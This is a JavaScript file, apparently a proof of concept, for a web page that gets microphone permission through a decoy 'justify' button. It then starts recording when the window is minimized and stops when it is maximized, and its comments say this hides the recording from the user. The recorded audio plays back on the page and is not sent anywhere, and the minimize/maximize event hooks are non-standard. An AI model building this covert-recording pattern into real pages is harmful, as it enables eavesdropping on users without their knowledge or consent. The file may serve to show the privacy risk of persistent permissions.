// local microphone stream and recorder on that stream
let mediaStream = null;
let mediaRecorder = null;
// elements to display output or receive input
let messageList = document.getElementById('messages');
let justifyButton = document.getElementById('justifyButton');
// object to store recorded data in with utility functions
let sink = {
    _chunks: [],
    getDataAsBlob(){
        return new Blob(this._chunks, { 'type' : 'audio/ogg; codecs=opus' });
    },
    getDataAsSrcUrl(){
        return window.URL.createObjectURL(this.getDataAsBlob());
    },
    getRecordFunction(){
        this._chunks = [];
        return e => this._chunks.push(e.data);
    }
};

// the user must have some reason to give the page at least one time access to his microphone
// this button is just a placeholder for this useful function that the user wants to use.
// it just records 1 second and stops then, like a user that now does not want to use this function any more
justifyButton.addEventListener("click", function(){
    startRecording();
    showMessage("The user uses the microphone (desired by the user)");
    let delay = setTimeout(function(){
        stopRecording();
        showMessage("The user stops using the microphone");
        clearTimeout(delay);
    },1000);
});

// when the window is maximized, stop to hide that you were recording
window.onmaximize = stopRecording;

// when the window gets minimized, start to record without the user noticing it
window.onminimize = startRecording;

/**
 * start the designated recorder
 * */
function startRecording(){
    console.log('startRecording');
    getRecorder().then(recorder => {
        console.log('getRecorder then');
        showMessage('start recording now');
        recorder.start();
        recorder.ondataavailable = sink.getRecordFunction();
        recorder.onstop = function(){
            console.log('onstop called');
            showAudio(sink.getDataAsSrcUrl());
            showMessage('Recorded data is set to audio element');
            clear();
        }
    });
}

/**
 * stop the designated recorder
 * */
function stopRecording(){
    console.log('stopRecording');
    getRecorder().then(recorder => {
        console.log('getRecorder then');
        showMessage('Recorder stops');
        let attempts = 10;
        let poll = setInterval(function () {
            if (attempts <= 0) {
                if (recorder.state === 'recording') recorder.stop();
                clearInterval(poll);
            }
            attempts--;
        }, 500);
    });
}


/**
 * Singleton function to get a microphone audio stream
 * @return Promise returns a promise that resolves to a stream or an error that occurred getting the user media
 * */
function getMedia(){
    if(mediaStream){
        return Promise.resolve(mediaStream);
    }else{
        return navigator.mediaDevices.getUserMedia({
            audio: true,
            video: false
        }).then(stream => {
            mediaStream = stream;
            return stream;
        });
    }
}

/**
 * Singleton function to get a recorder on the microphone stream
 * @return Promise returns a promise that resolves with a media recorder that records the local microphone stream
 * */
function getRecorder(){
    if(mediaRecorder){
        return Promise.resolve(mediaRecorder);
    }else{
        return getMedia().then(stream => {
            mediaRecorder = new MediaRecorder(stream);
            return mediaRecorder;
        });
    }
}

/**
 * Resets the streams and users so that the page is not recording any more
 * */
function clear(){
    if(mediaRecorder && mediaRecorder.state === 'recording'){
        mediaRecorder.stop();
    }
    if(mediaStream) mediaStream.getAudioTracks().forEach(track => {
        if(track.stop) track.stop()
    });
    mediaRecorder = null;
    mediaStream = null;
}


// ---------------- only utility functions down here ----------------------

/**
 * display text on page (with the date)
 * @param content the text to show
 * */
function showMessage(content){
    let li = document.createElement('li');
    li.setAttribute('class','message card');
    let section = document.createElement('section');
    let footer = document.createElement('footer');
    footer.innerHTML = (new Date()).toLocaleTimeString('de-De',{hour: '2-digit', minute: '2-digit', second: '2-digit'});
    let article = document.createElement('article');
    if(content instanceof Node){
        article.appendChild(content);
    }else{
        article.innerHTML = content;
    }
    li.appendChild(section);
    section.appendChild(article);
    section.appendChild(footer);
    messageList.insertBefore(li, messageList.firstChild);
}

/**
 * display an audio file as message
 * @param url the url as String to the audio file source
 * */
function showAudio(url){
    let audio = document.createElement('audio');
    audio.setAttribute("controls","");
    audio.setAttribute("src",url);
    showMessage(audio);
}